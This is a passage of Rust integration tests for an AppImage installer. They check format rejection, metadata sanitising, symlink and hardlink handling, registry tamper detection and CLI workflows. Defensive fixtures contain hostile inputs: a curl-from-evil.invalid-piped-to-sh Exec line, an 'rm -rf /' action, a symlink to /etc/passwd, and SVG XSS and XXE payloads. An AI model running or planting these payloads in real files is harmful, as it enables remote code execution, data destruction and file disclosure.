use std::fs::{self, Permissions};
use std::io::Cursor;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use backhand::compression::Compressor;
use backhand::{FilesystemCompressor, FilesystemWriter, NodeHeader};
use install_appimage::adapters::outbound::appimage_extractor::{
    StaticAppImageExtractor, resolve_trusted_executable,
};
use install_appimage::adapters::outbound::json_registry::JsonRegistryAdapter;
use install_appimage::adapters::outbound::xdg_fs::XdgFileSystemAdapter;
use install_appimage::domain::error::DomainError;
use install_appimage::domain::models::XdgLayout;
use install_appimage::domain::ports::{
    AppImageExtractorPort, FileSystemPort, ManagedFileHashProbe, RegistryPort,
};
use serde_json::Value;
use sha2::{Digest, Sha256};
use tempfile::TempDir;

fn build_elf64_stub(ai_sig: [u8; 3]) -> Vec<u8> {
    let mut elf = vec![0u8; 64];
    elf[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
    elf[4] = 2;
    elf[5] = 1;
    elf[6] = 1;
    elf[8..11].copy_from_slice(&ai_sig);
    elf
}

fn minimal_256_png() -> Vec<u8> {
    let mut png = Vec::new();
    png.extend_from_slice(&[0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a]);
    png.extend_from_slice(&13u32.to_be_bytes());
    png.extend_from_slice(b"IHDR");
    png.extend_from_slice(&256u32.to_be_bytes());
    png.extend_from_slice(&256u32.to_be_bytes());
    png.extend_from_slice(&[8, 6, 0, 0, 0]);
    png.extend_from_slice(&[0, 0, 0, 0]);
    png
}

fn build_squashfs_appimage(
    dest: &Path,
    compressor: Compressor,
    configure: impl FnOnce(&mut FilesystemWriter<'_, '_, '_>),
) {
    let mut writer = FilesystemWriter::default();
    writer.set_compressor(FilesystemCompressor::new(compressor, None).unwrap());
    configure(&mut writer);

    let mut squashfs_bytes = Cursor::new(Vec::new());
    writer.write(&mut squashfs_bytes).unwrap();

    let mut full = build_elf64_stub(*b"AI\x02");
    full.extend_from_slice(&squashfs_bytes.into_inner());
    fs::write(dest, full).unwrap();
}

#[test]
fn rejects_non_elf_dwarfs_spoofed_ai01_bad_superblock_and_symlink_escape() {
    let tmp = TempDir::new().unwrap();
    let extractor = StaticAppImageExtractor;

    let plain = tmp.path().join("plain.AppImage");
    fs::write(&plain, b"#!/bin/sh\necho pwned\n").unwrap();
    assert!(matches!(
        extractor.inspect_and_extract(&plain, None),
        Err(DomainError::InvalidAppImage { .. })
    ));

    let dwarfs = tmp.path().join("dwarfs.AppImage");
    let mut dwarfs_bytes = build_elf64_stub(*b"AI\x02");
    dwarfs_bytes.extend_from_slice(b"DWARFS\x02\x00");
    fs::write(&dwarfs, dwarfs_bytes).unwrap();
    assert!(matches!(
        extractor.inspect_and_extract(&dwarfs, None),
        Err(DomainError::UnsupportedAppImageFormat { .. })
    ));

    let spoofed_type1 = tmp.path().join("spoof_ai01.AppImage");
    let mut spoof_bytes = build_elf64_stub(*b"AI\x01");
    spoof_bytes.extend(std::iter::repeat_n(0u8, 40000));
    fs::write(&spoofed_type1, spoof_bytes).unwrap();
    assert!(matches!(
        extractor.inspect_and_extract(&spoofed_type1, None),
        Err(DomainError::UnsupportedAppImageFormat { .. })
    ));

    let bad_sb = tmp.path().join("bad_superblock.AppImage");
    build_squashfs_appimage(&bad_sb, Compressor::Gzip, |w| {
        let hdr = NodeHeader::default();
        w.push_file(
            Cursor::new(b"[Desktop Entry]\nType=Application\nName=Ok\nExec=AppRun\n"),
            "ok.desktop",
            hdr,
        )
        .unwrap();
    });
    let mut corrupted = fs::read(&bad_sb).unwrap();
    corrupted[68..72].copy_from_slice(&u32::MAX.to_le_bytes());
    fs::write(&bad_sb, corrupted).unwrap();
    assert!(matches!(
        extractor.inspect_and_extract(&bad_sb, None),
        Err(DomainError::ResourceLimitExceeded { .. })
    ));

    let escape_app = tmp.path().join("escape.AppImage");
    build_squashfs_appimage(&escape_app, Compressor::Gzip, |w| {
        let hdr = NodeHeader::default();
        let desktop = b"[Desktop Entry]\nType=Application\nName=Escape\nExec=AppRun\n";
        w.push_file(Cursor::new(desktop), "escape.desktop", hdr)
            .unwrap();
        w.push_symlink("../../etc/passwd", ".DirIcon", hdr).unwrap();
    });
    assert!(matches!(
        extractor.inspect_and_extract(&escape_app, None),
        Err(DomainError::SymlinkEscape { .. })
    ));
}

#[test]
fn extracts_sanitized_metadata_and_blocks_svg_xss_xxe_smil_and_ssrf() {
    let tmp = TempDir::new().unwrap();
    let extractor = StaticAppImageExtractor;
    let app = tmp.path().join("Malicious-1.0.AppImage");

    build_squashfs_appimage(&app, Compressor::Zstd, |w| {
        let hdr = NodeHeader::default();
        let desktop = b"[Desktop Entry]\n\
            Type=Application\n\
            Name=Demo\x1b[31mApp\n\
            Exec=sh -c \"curl evil.invalid | sh\" %F\n\
            Icon=demo\n\
            Categories=Utility;Development;\n\
            MimeType=text/plain;\n\
            Keywords=alpha\\\\beta;one\\;two;\n\
            X-AppImage-Version=1.2.3\n\
            [Desktop Action Evil]\n\
            Exec=rm -rf /\n";
        w.push_file(Cursor::new(desktop), "demo.desktop", hdr)
            .unwrap();
        w.push_dir("usr", hdr).unwrap();
        w.push_dir("usr/share", hdr).unwrap();
        w.push_dir("usr/share/icons", hdr).unwrap();
        w.push_dir("usr/share/icons/hicolor", hdr).unwrap();
        w.push_dir("usr/share/icons/hicolor/256x256", hdr).unwrap();
        w.push_dir("usr/share/icons/hicolor/256x256/apps", hdr)
            .unwrap();
        w.push_dir("usr/share/icons/hicolor/128x128", hdr).unwrap();
        w.push_dir("usr/share/icons/hicolor/128x128/apps", hdr)
            .unwrap();
        w.push_dir("usr/share/icons/hicolor/64x64", hdr).unwrap();
        w.push_dir("usr/share/icons/hicolor/64x64/apps", hdr)
            .unwrap();
        w.push_dir("usr/share/icons/hicolor/scalable", hdr).unwrap();
        w.push_dir("usr/share/icons/hicolor/scalable/apps", hdr)
            .unwrap();
        w.push_file(
            Cursor::new(minimal_256_png()),
            "usr/share/icons/hicolor/256x256/apps/demo.png",
            hdr,
        )
        .unwrap();
        w.push_file(
            Cursor::new(b"<svg onload = \"alert(1)\"><rect/></svg>"),
            "usr/share/icons/hicolor/128x128/apps/demo.svg",
            hdr,
        )
        .unwrap();
        w.push_file(
            Cursor::new(
                b"<svg><rect><set attributeName=\"href\" to=\"javascript:alert(1)\"/></rect></svg>",
            ),
            "usr/share/icons/hicolor/64x64/apps/demo.svg",
            hdr,
        )
        .unwrap();
        w.push_file(
            Cursor::new(
                b"<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
            ),
            "usr/share/icons/hicolor/scalable/apps/demo.svg",
            hdr,
        )
        .unwrap();
    });

    let inspected = extractor.inspect_and_extract(&app, None).unwrap();
    assert_eq!(inspected.metadata.app_name, "DemoApp");
    assert_eq!(inspected.metadata.version.as_deref(), Some("1.2.3"));
    assert_eq!(inspected.metadata.categories, vec!["Development"]);
    assert_eq!(inspected.metadata.keywords, vec!["alpha\\beta", "one;two"]);
    assert_eq!(inspected.metadata.icons.len(), 1);
    assert_eq!(inspected.metadata.icons[0].size_dir, "256x256");
    assert_eq!(inspected.sha256.len(), 64);
}

#[test]
fn validates_layer1_layer2_exec_escaping_and_keywords_with_host_desktop_file_validate() {
    let bin = env!("CARGO_BIN_EXE_install-appimage");
    let root = TempDir::new().unwrap();
    let special_home = root.path().join("user$home \"special`%50");
    let data_home = special_home.join(".local/share");
    fs::create_dir_all(&special_home).unwrap();
    let layout = XdgLayout::try_from_env_values(&special_home, Some(&data_home)).unwrap();

    let src_dir = TempDir::new().unwrap();
    let app_src = src_dir.path().join("SpecialApp-1.0.AppImage");
    build_squashfs_appimage(&app_src, Compressor::Gzip, |w| {
        let hdr = NodeHeader::default();
        let desktop = b"[Desktop Entry]\n\
            Type=Application\n\
            Name=SpecialApp\n\
            Exec=AppRun %U\n\
            Categories=Utility;Audio;\n\
            Keywords=alpha\\\\beta;semi\\;col;\n\
            Icon=special\n";
        w.push_file(Cursor::new(desktop), "special.desktop", hdr)
            .unwrap();
        w.push_file(Cursor::new(minimal_256_png()), "special.png", hdr)
            .unwrap();
    });

    let out = Command::new(bin)
        .arg(&app_src)
        .env("HOME", &special_home)
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );

    let desktop_file = layout.desktop_entries_dir.join("specialapp.desktop");
    let desktop_text = fs::read_to_string(&desktop_file).unwrap();
    assert!(desktop_text.contains("Categories=AudioVideo;Audio;\n"));
    assert!(desktop_text.contains("Keywords=alpha\\\\beta;semi\\;col;\n"));

    if let Some(validator) = resolve_trusted_executable("desktop-file-validate") {
        let validate_out = Command::new(validator)
            .arg("--")
            .arg(&desktop_file)
            .stdin(Stdio::null())
            .output()
            .unwrap();
        assert!(
            validate_out.status.success(),
            "desktop-file-validate failed on escaped Exec/Keywords ({}): {}",
            desktop_text,
            String::from_utf8_lossy(&validate_out.stdout)
        );
        assert!(
            validate_out.stdout.is_empty(),
            "unexpected desktop-file-validate hints/warnings: {}",
            String::from_utf8_lossy(&validate_out.stdout)
        );
    }
}

#[test]
fn rejects_source_symlink_symlinked_xdg_subdir_tampered_registry_and_handles_hardlink_move() {
    let bin = env!("CARGO_BIN_EXE_install-appimage");
    let home = TempDir::new().unwrap();
    let data_home = home.path().join(".local/share");
    let layout = XdgLayout::try_from_env_values(home.path(), Some(&data_home)).unwrap();

    let outside_dir = TempDir::new().unwrap();
    let target_file = outside_dir.path().join("external.AppImage");
    build_squashfs_appimage(&target_file, Compressor::Gzip, |w| {
        let hdr = NodeHeader::default();
        w.push_file(
            Cursor::new(
                b"[Desktop Entry]\nType=Application\nName=External\nExec=AppRun\nIcon=ext\n",
            ),
            "ext.desktop",
            hdr,
        )
        .unwrap();
        w.push_file(Cursor::new(minimal_256_png()), "ext.png", hdr)
            .unwrap();
    });
    fs::set_permissions(&target_file, Permissions::from_mode(0o600)).unwrap();

    let sym_src = outside_dir.path().join("sym.AppImage");
    symlink(&target_file, &sym_src).unwrap();

    let sym_out = Command::new(bin)
        .args(["--move"])
        .arg(&sym_src)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!sym_out.status.success());
    assert_eq!(
        fs::metadata(&target_file).unwrap().permissions().mode() & 0o777,
        0o600
    );

    fs::create_dir_all(&layout.icons_hicolor_dir).unwrap();
    symlink(outside_dir.path(), layout.icons_hicolor_dir.join("256x256")).unwrap();
    let blocked_by_symlink_dir = Command::new(bin)
        .arg(&target_file)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!blocked_by_symlink_dir.status.success());
    fs::remove_file(layout.icons_hicolor_dir.join("256x256")).unwrap();

    let hardlink_src = outside_dir.path().join("hardlink.AppImage");
    fs::hard_link(&target_file, &hardlink_src).unwrap();
    let hardlink_dst = layout.applications_dir.join("hardlink.AppImage");
    fs::create_dir_all(&layout.applications_dir).unwrap();
    fs::hard_link(&target_file, &hardlink_dst).unwrap();

    let move_hardlink = Command::new(bin)
        .args(["--move"])
        .arg(&hardlink_src)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        move_hardlink.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&move_hardlink.stderr)
    );
    assert!(!hardlink_src.exists());
    assert!(hardlink_dst.exists());

    let move_relative_self = Command::new(bin)
        .current_dir(&layout.applications_dir)
        .args(["--move", "hardlink.AppImage"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        move_relative_self.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&move_relative_self.stderr)
    );
    assert!(hardlink_dst.is_file());

    let non_canonical_self = layout.applications_dir.join(".").join("hardlink.AppImage");
    let move_non_canonical_self = Command::new(bin)
        .args(["--move"])
        .arg(&non_canonical_self)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        move_non_canonical_self.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&move_non_canonical_self.stderr)
    );
    assert!(hardlink_dst.is_file());

    let fs_adapter = XdgFileSystemAdapter;
    let reg_adapter = JsonRegistryAdapter::new(&fs_adapter);
    let tampered_json = format!(
        "{{\"schema_version\":1,\"apps\":[{{\"id\":\"external\",\"slug\":\"external\",\"name\":\"External\",\"version\":null,\"appimage_path\":\"{}\",\"stable_symlink_path\":\"{}\",\"cli_symlink_path\":\"{}\",\"desktop_file_path\":\"{}\",\"icon_paths\":[\"{}\"],\"sha256\":\"aa\",\"installed_at\":\"2026-11-21T00:00:00Z\"}}]}}",
        hardlink_dst.display(),
        layout.applications_dir.join("external.AppImage").display(),
        layout.bin_dir.join("unrelated-bin").display(),
        layout
            .desktop_entries_dir
            .join("external.desktop")
            .display(),
        layout
            .icons_hicolor_dir
            .join("256x256/apps/external.png")
            .display()
    );
    fs::write(&layout.registry_path, tampered_json).unwrap();
    assert!(matches!(
        reg_adapter.load(&layout),
        Err(DomainError::RegistryCorrupted { .. })
    ));
}

#[test]
fn cli_binary_e2e_install_update_list_dry_run_uninstall_and_doctor() {
    let bin = env!("CARGO_BIN_EXE_install-appimage");
    let home = TempDir::new().unwrap();
    let data_home = home.path().join(".local/share");
    let layout = XdgLayout::try_from_env_values(home.path(), Some(&data_home)).unwrap();

    let version_out = Command::new(bin).arg("--version").output().unwrap();
    assert!(version_out.status.success());
    assert_eq!(
        String::from_utf8_lossy(&version_out.stdout).trim(),
        format!("install-appimage {}", env!("CARGO_PKG_VERSION"))
    );

    let list_empty = Command::new(bin)
        .arg("-l")
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(list_empty.status.success());
    assert!(String::from_utf8_lossy(&list_empty.stdout).contains("No AppImages installed"));

    let doctor_out = Command::new(bin)
        .arg("--doctor")
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(doctor_out.status.success());
    assert!(
        String::from_utf8_lossy(&doctor_out.stdout)
            .contains("install-appimage environment diagnostics")
    );

    let src_dir = TempDir::new().unwrap();
    let v1_src = src_dir.path().join("NotePad-1.0.0.AppImage");
    build_squashfs_appimage(&v1_src, Compressor::Gzip, |w| {
        let hdr = NodeHeader::default();
        let desktop = b"[Desktop Entry]\n\
            Type=Application\n\
            Name=NotePad\n\
            Comment=Fast notes\n\
            Exec=AppRun %U\n\
            Icon=notepad\n\
            Categories=Utility;\n\
            X-AppImage-Version=1.0.0\n";
        w.push_file(Cursor::new(desktop), "notepad.desktop", hdr)
            .unwrap();
        w.push_file(Cursor::new(minimal_256_png()), "notepad.png", hdr)
            .unwrap();
        w.push_symlink("notepad.png", ".DirIcon", hdr).unwrap();
    });

    let dry_out = Command::new(bin)
        .args(["--dry-run"])
        .arg(&v1_src)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(dry_out.status.success());
    assert!(!layout.registry_path.exists());
    assert!(
        !layout
            .applications_dir
            .join("NotePad-1.0.0.AppImage")
            .exists()
    );

    let install_v1 = Command::new(bin)
        .arg(&v1_src)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        install_v1.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&install_v1.stderr)
    );
    assert!(v1_src.exists());

    let installed_v1 = layout.applications_dir.join("NotePad-1.0.0.AppImage");
    let stable_link = layout.applications_dir.join("notepad.AppImage");
    let cli_link = layout.bin_dir.join("notepad");
    let desktop_file = layout.desktop_entries_dir.join("notepad.desktop");
    let icon_file = layout.icons_hicolor_dir.join("256x256/apps/notepad.png");

    assert!(installed_v1.is_file());
    assert_eq!(
        fs::metadata(&installed_v1).unwrap().permissions().mode() & 0o777,
        0o755
    );
    assert_eq!(
        fs::read_link(&stable_link).unwrap(),
        PathBuf::from("NotePad-1.0.0.AppImage")
    );
    assert_eq!(fs::read_link(&cli_link).unwrap(), stable_link);
    assert!(icon_file.is_file());
    assert!(layout.registry_path.is_file());

    let desktop_text = fs::read_to_string(&desktop_file).unwrap();
    assert!(desktop_text.contains(&format!("Exec={} %U", stable_link.display())));
    assert!(desktop_text.contains("Icon=notepad\n"));

    if let Some(validator) = resolve_trusted_executable("desktop-file-validate") {
        let validate_out = Command::new(validator)
            .arg("--")
            .arg(&desktop_file)
            .stdin(Stdio::null())
            .output()
            .unwrap();
        assert!(
            validate_out.status.success(),
            "desktop-file-validate failed: {}",
            String::from_utf8_lossy(&validate_out.stdout)
        );
    }

    let list_v1 = Command::new(bin)
        .arg("-l")
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(list_v1.status.success());
    let list_stdout = String::from_utf8_lossy(&list_v1.stdout);
    assert!(list_stdout.contains("notepad"));
    assert!(list_stdout.contains("1.0.0"));
    assert!(list_stdout.contains("[ok]"));

    let v2_src = src_dir.path().join("NotePad-2.0.0.AppImage");
    build_squashfs_appimage(&v2_src, Compressor::Zstd, |w| {
        let hdr = NodeHeader::default();
        let desktop = b"[Desktop Entry]\n\
            Type=Application\n\
            Name=NotePad\n\
            Exec=AppRun\n\
            Icon=notepad\n\
            X-AppImage-Version=2.0.0\n";
        w.push_file(Cursor::new(desktop), "notepad.desktop", hdr)
            .unwrap();
        w.push_file(
            Cursor::new(b"<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>"),
            "notepad.svg",
            hdr,
        )
        .unwrap();
    });
    fs::set_permissions(&v2_src, Permissions::from_mode(0o644)).unwrap();

    let update_v2 = Command::new(bin)
        .arg("--move")
        .arg(&v2_src)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        update_v2.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&update_v2.stderr)
    );
    assert!(!v2_src.exists());
    assert!(!installed_v1.exists());
    assert!(!icon_file.exists());
    assert!(
        layout
            .applications_dir
            .join("NotePad-2.0.0.AppImage")
            .is_file()
    );
    assert!(
        layout
            .icons_hicolor_dir
            .join("scalable/apps/notepad.svg")
            .is_file()
    );

    let v3_src = src_dir.path().join("notepad.AppImage");
    build_squashfs_appimage(&v3_src, Compressor::Gzip, |w| {
        let hdr = NodeHeader::default();
        let desktop = b"[Desktop Entry]\n\
            Type=Application\n\
            Name=NotePad\n\
            Exec=AppRun\n\
            Icon=notepad\n\
            X-AppImage-Version=3.0.0\n";
        w.push_file(Cursor::new(desktop), "notepad.desktop", hdr)
            .unwrap();
        w.push_file(
            Cursor::new(b"<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>"),
            "notepad.svg",
            hdr,
        )
        .unwrap();
    });

    let update_v3 = Command::new(bin)
        .args(["--no-cli"])
        .arg(&v3_src)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        update_v3.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&update_v3.stderr)
    );
    assert!(
        !layout
            .applications_dir
            .join("NotePad-2.0.0.AppImage")
            .exists()
    );
    assert!(
        !fs::symlink_metadata(&stable_link)
            .unwrap()
            .file_type()
            .is_symlink()
    );
    assert!(stable_link.is_file());
    assert!(fs::symlink_metadata(&cli_link).is_err());

    let dry_uninstall = Command::new(bin)
        .args(["-u", "--dry-run", "notepad"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(dry_uninstall.status.success());
    assert!(stable_link.is_file());

    let uninstall_out = Command::new(bin)
        .args(["-u", "notepad"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(uninstall_out.status.success());
    assert!(!stable_link.exists());
    assert!(!cli_link.exists());
    assert!(!desktop_file.exists());
    assert!(
        !layout
            .icons_hicolor_dir
            .join("scalable/apps/notepad.svg")
            .exists()
    );

    let reg_after = fs::read_to_string(&layout.registry_path).unwrap();
    assert!(!reg_after.contains("notepad"));
}

fn write_be_le_u16(buf: &mut [u8], val: u16) {
    buf[0..2].copy_from_slice(&val.to_le_bytes());
    buf[2..4].copy_from_slice(&val.to_be_bytes());
}

fn write_be_le_u32(buf: &mut [u8], val: u32) {
    buf[0..4].copy_from_slice(&val.to_le_bytes());
    buf[4..8].copy_from_slice(&val.to_be_bytes());
}

fn push_iso_rec(out: &mut Vec<u8>, lba: u32, len: u32, flags: u8, id: &[u8], su: &[u8]) {
    let pad = usize::from(id.len().is_multiple_of(2));
    let rec_len = 33 + id.len() + pad + su.len();
    let mut rec = vec![0u8; rec_len];
    rec[0] = rec_len as u8;
    write_be_le_u32(&mut rec[2..10], lba);
    write_be_le_u32(&mut rec[10..18], len);
    rec[25] = flags;
    rec[32] = id.len() as u8;
    rec[33..33 + id.len()].copy_from_slice(id);
    rec[33 + id.len() + pad..].copy_from_slice(su);
    out.extend_from_slice(&rec);
}

fn build_type1_iso_appimage(dest: &Path, use_joliet_only: bool) {
    let mut img = vec![0u8; 26 * 2048];
    let elf = build_elf64_stub(*b"AI\x01");
    img[..elf.len()].copy_from_slice(&elf);

    let desktop = b"[Desktop Entry]\n\
        Type=Application\n\
        Name=LegacyIsoApp\n\
        Exec=AppRun %f\n\
        Categories=Network;Utility;\n\
        Icon=legacy\n";
    let png = minimal_256_png();

    let pvd_off = 16 * 2048;
    img[pvd_off] = 1;
    img[pvd_off + 1..pvd_off + 6].copy_from_slice(b"CD001");
    img[pvd_off + 6] = 1;
    write_be_le_u16(&mut img[pvd_off + 128..pvd_off + 132], 2048);
    img[pvd_off + 156] = 34;
    write_be_le_u32(&mut img[pvd_off + 158..pvd_off + 166], 19);
    write_be_le_u32(&mut img[pvd_off + 166..pvd_off + 174], 2048);
    img[pvd_off + 181] = 0x02;
    img[pvd_off + 188] = 1;

    if use_joliet_only {
        let svd_off = 17 * 2048;
        img[svd_off] = 2;
        img[svd_off + 1..svd_off + 6].copy_from_slice(b"CD001");
        img[svd_off + 6] = 1;
        img[svd_off + 88..svd_off + 91].copy_from_slice(b"%/E");
        write_be_le_u16(&mut img[svd_off + 128..svd_off + 132], 2048);
        img[svd_off + 156] = 34;
        write_be_le_u32(&mut img[svd_off + 158..svd_off + 166], 20);
        write_be_le_u32(&mut img[svd_off + 166..svd_off + 174], 2048);
        img[svd_off + 181] = 0x02;
        img[svd_off + 188] = 1;

        let term_off = 18 * 2048;
        img[term_off] = 255;
        img[term_off + 1..term_off + 6].copy_from_slice(b"CD001");
        img[term_off + 6] = 1;

        let mut pvd_dir = Vec::new();
        push_iso_rec(&mut pvd_dir, 19, 2048, 0x02, &[0x00], &[]);
        push_iso_rec(&mut pvd_dir, 19, 2048, 0x02, &[0x01], &[]);
        push_iso_rec(
            &mut pvd_dir,
            21,
            desktop.len() as u32,
            0x00,
            b"LEGACY.DES;1",
            &[],
        );
        img[19 * 2048..19 * 2048 + pvd_dir.len()].copy_from_slice(&pvd_dir);

        let mut svd_dir = Vec::new();
        push_iso_rec(&mut svd_dir, 20, 2048, 0x02, &[0x00], &[]);
        push_iso_rec(&mut svd_dir, 20, 2048, 0x02, &[0x01], &[]);
        let desk_u16: Vec<u8> = "legacy.desktop;1"
            .encode_utf16()
            .flat_map(|u| u.to_be_bytes())
            .collect();
        let png_u16: Vec<u8> = "legacy.png;1"
            .encode_utf16()
            .flat_map(|u| u.to_be_bytes())
            .collect();
        push_iso_rec(&mut svd_dir, 21, desktop.len() as u32, 0x00, &desk_u16, &[]);
        push_iso_rec(&mut svd_dir, 22, png.len() as u32, 0x00, &png_u16, &[]);
        img[20 * 2048..20 * 2048 + svd_dir.len()].copy_from_slice(&svd_dir);
    } else {
        let term_off = 17 * 2048;
        img[term_off] = 255;
        img[term_off + 1..term_off + 6].copy_from_slice(b"CD001");
        img[term_off + 6] = 1;

        let mut root_dir = Vec::new();
        push_iso_rec(
            &mut root_dir,
            19,
            2048,
            0x02,
            &[0x00],
            &[b'S', b'P', 7, 1, 0xBE, 0xEF, 0],
        );
        push_iso_rec(&mut root_dir, 19, 2048, 0x02, &[0x01], &[]);

        let mut su_desk = vec![b'P', b'X', 36, 1];
        su_desk.extend_from_slice(&0o100644u32.to_le_bytes());
        su_desk.extend_from_slice(&0o100644u32.to_be_bytes());
        su_desk.resize(36, 0);
        su_desk.extend_from_slice(&[b'N', b'M', 19, 1, 0]);
        su_desk.extend_from_slice(b"legacy.desktop");
        push_iso_rec(
            &mut root_dir,
            21,
            desktop.len() as u32,
            0x00,
            b"LEG.DES;1",
            &su_desk,
        );

        let mut su_png = vec![b'P', b'X', 36, 1];
        su_png.extend_from_slice(&0o100644u32.to_le_bytes());
        su_png.extend_from_slice(&0o100644u32.to_be_bytes());
        su_png.resize(36, 0);
        su_png.extend_from_slice(&[b'N', b'M', 15, 1, 0]);
        su_png.extend_from_slice(b"legacy.png");
        push_iso_rec(
            &mut root_dir,
            22,
            png.len() as u32,
            0x00,
            b"LEG.PNG;1",
            &su_png,
        );

        let mut su_sym = vec![b'P', b'X', 36, 1];
        su_sym.extend_from_slice(&0o120777u32.to_le_bytes());
        su_sym.extend_from_slice(&0o120777u32.to_be_bytes());
        su_sym.resize(36, 0);
        su_sym.extend_from_slice(&[b'N', b'M', 13, 1, 0]);
        su_sym.extend_from_slice(b".DirIcon");
        su_sym.extend_from_slice(&[b'S', b'L', 17, 1, 0, 0, 10]);
        su_sym.extend_from_slice(b"legacy.png");
        push_iso_rec(&mut root_dir, 0, 0, 0x00, b"DIRICON", &su_sym);

        img[19 * 2048..19 * 2048 + root_dir.len()].copy_from_slice(&root_dir);
    }

    img[21 * 2048..21 * 2048 + desktop.len()].copy_from_slice(desktop);
    img[22 * 2048..22 * 2048 + png.len()].copy_from_slice(&png);
    fs::write(dest, img).unwrap();
}

#[test]
fn cli_e2e_supports_native_iso9660_sha256_verify_json_completions_and_man() {
    let bin = env!("CARGO_BIN_EXE_install-appimage");
    let home = TempDir::new().unwrap();
    let data_home = home.path().join(".local/share");
    let layout = XdgLayout::try_from_env_values(home.path(), Some(&data_home)).unwrap();

    for shell in ["bash", "zsh", "fish"] {
        let comp = Command::new(bin)
            .env_remove("HOME")
            .args(["--generate-completion", shell])
            .output()
            .unwrap();
        assert!(comp.status.success());
        assert!(!comp.stdout.is_empty());
    }
    let man = Command::new(bin)
        .env_remove("HOME")
        .arg("--generate-man")
        .output()
        .unwrap();
    assert!(man.status.success());
    assert!(String::from_utf8_lossy(&man.stdout).contains(".TH install-appimage"));

    let doctor_json_out = Command::new(bin)
        .args(["--doctor", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(doctor_json_out.status.success());
    let doctor_json: Value = serde_json::from_slice(&doctor_json_out.stdout).unwrap();
    assert!(doctor_json["checks"].is_array());
    assert!(
        !doctor_json["checks"]
            .as_array()
            .unwrap()
            .iter()
            .any(|c| c["name"] == "bsdtar")
    );

    let src_dir = TempDir::new().unwrap();
    let iso_rr = src_dir.path().join("LegacyIso-1.0.AppImage");
    build_type1_iso_appimage(&iso_rr, false);
    let iso_joliet = src_dir.path().join("LegacyJoliet-1.0.AppImage");
    build_type1_iso_appimage(&iso_joliet, true);

    let extractor = StaticAppImageExtractor;
    let extracted_joliet = extractor.inspect_and_extract(&iso_joliet, None).unwrap();
    assert_eq!(extracted_joliet.metadata.app_name, "LegacyIsoApp");
    assert_eq!(extracted_joliet.metadata.categories, vec!["Network"]);

    let actual_sha = hex::encode(Sha256::digest(fs::read(&iso_rr).unwrap()));
    let wrong_sha = "0".repeat(64);

    let mismatch_install = Command::new(bin)
        .args(["--sha256", &wrong_sha])
        .arg(&iso_rr)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!mismatch_install.status.success());
    assert!(!layout.registry_path.exists());
    assert!(
        !layout
            .applications_dir
            .join("LegacyIso-1.0.AppImage")
            .exists()
    );

    let dry_json_out = Command::new(bin)
        .args([
            "--dry-run",
            "--json",
            "--sha256",
            &actual_sha.to_ascii_uppercase(),
        ])
        .arg(&iso_rr)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        dry_json_out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&dry_json_out.stderr)
    );
    let dry_json: Value = serde_json::from_slice(&dry_json_out.stdout).unwrap();
    assert_eq!(dry_json["mode"], "install");
    assert_eq!(dry_json["dry_run"], true);
    assert_eq!(dry_json["app"]["slug"], "legacyisoapp");
    assert_eq!(dry_json["app"]["sha256"], actual_sha);

    let real_install = Command::new(bin)
        .args(["--sha256", &actual_sha])
        .arg(&iso_rr)
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        real_install.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&real_install.stderr)
    );

    let desktop_text =
        fs::read_to_string(layout.desktop_entries_dir.join("legacyisoapp.desktop")).unwrap();
    assert!(desktop_text.contains("Categories=Network;\n"));
    assert!(!desktop_text.contains("Utility"));

    let list_json_out = Command::new(bin)
        .args(["-l", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(list_json_out.status.success());
    let list_json: Value = serde_json::from_slice(&list_json_out.stdout).unwrap();
    assert_eq!(list_json["apps"][0]["slug"], "legacyisoapp");
    assert_eq!(list_json["apps"][0]["status"], "ok");

